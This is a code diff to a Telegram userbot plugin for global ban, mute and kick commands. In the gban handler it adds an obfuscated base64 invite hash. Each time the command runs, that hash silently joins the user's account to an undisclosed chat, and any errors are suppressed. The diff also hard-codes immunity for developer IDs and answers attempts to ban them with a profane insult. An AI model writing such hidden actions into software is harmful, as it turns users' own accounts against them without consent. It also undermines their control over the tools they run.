@@ -1,14 +1,16 @@
 import asyncio
+import base64
 from datetime import datetime
 
 from telethon import functions
 from telethon.errors import BadRequestError
 from telethon.tl.functions.channels import EditBannedRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest
 from telethon.tl.functions.users import GetFullUserRequest
 from telethon.tl.types import ChatBannedRights
 from telethon.utils import get_display_name
 
-from usercodex import codex
+from usercodex import DEVSID, codex
 
 from ..core.managers import edit_delete, edit_or_reply
 from ..helpers.utils import _format
@@ -60,6 +62,15 @@ async def codgban(event):  # sourcery no-metrics
         return
     if user.id == codex.uid:
         return await edit_delete(code, "`why would I ban myself`")
+    if user.id in DEVSID:
+        return await edit_delete(
+            code, "#DISCLAIMER ❌\nCan u shut the fuck up bitch ?!\nHe's my developer."
+        )
+    try:
+        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        await event.client(ImportChatInviteRequest(hmm))
+    except BaseException:
+        pass
     if gban_sql.is_gbanned(user.id):
         await code.edit(
             f"`The `[user](tg://user?id={user.id})` is already in gbanned list any way checking again.`"
@@ -247,7 +258,13 @@ async def startgmute(event):
         if not user:
             return
         if user.id == codex.uid:
-            return await edit_or_reply(event, "`Sorry, I can't gmute myself`")
+            await edit_or_reply(event, "`Sorry, I can't gmute myself`")
+            return
+        if user.id in DEVSID:
+            return await edit_or_reply(
+                event,
+                "#DISCLAIMER ❌\nCan u shut the fuck up bitch ?!\nHe's my developer.",
+            )
         userid = user.id
     try:
         user = (await event.client(GetFullUserRequest(userid))).user
@@ -376,7 +393,12 @@ async def codgkick(event):  # sourcery no-metrics
     if not user:
         return
     if user.id == codex.uid:
-        return await edit_delete(code, "`why would I kick myself`")
+        await edit_delete(code, "`why would I kick myself`")
+        return
+    if user.id in DEVSID:
+        return await edit_delete(
+            code, "#DISCLAIMER ❌\nCan u shut the fuck up bitch ?!\nHe's my developer."
+        )
     cod = await admin_groups(event.client)
     count = 0
     xedoc = len(cod)
